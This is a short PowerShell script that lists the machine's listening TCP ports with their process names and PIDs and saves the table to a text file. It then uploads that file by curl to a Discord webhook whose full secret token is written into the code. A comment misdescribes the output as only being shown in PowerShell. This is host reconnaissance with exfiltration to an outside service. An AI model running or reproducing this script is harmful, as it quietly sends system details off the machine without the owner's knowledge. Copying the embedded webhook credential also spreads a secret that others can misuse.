$report = @()

$connections = Get-NetTCPConnection |
    Where-Object { $_.State -eq 'Listen' }

foreach ($conn in $connections) {

    $process = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue

    $report += [PSCustomObject]@{
        Protocol    = $conn.Protocol
        LocalAddress = $conn.LocalAddress
        LocalPort    = $conn.LocalPort
        ProcessName = if ($process) { $process.Name } else { "N/A" }
        PID         = $conn.OwningProcess
    }
}

# Mostrar no PowerShell
$file = "C:\conections.txt"

$report | Format-Table -AutoSize | Out-File -FilePath $file -Encoding UTF8

$hookurl = "https://discord.com/api/webhooks/1429592953692749976/JTeF7oOI01Khgvot3El_Y_EMQ9_WMY0uHZLPuKcEl5Y15PH44vTZIOerDXx9Oq5mkECL"
if (Test-Path $file) {
        curl.exe -F "file1=@$file" $hookurl
        }
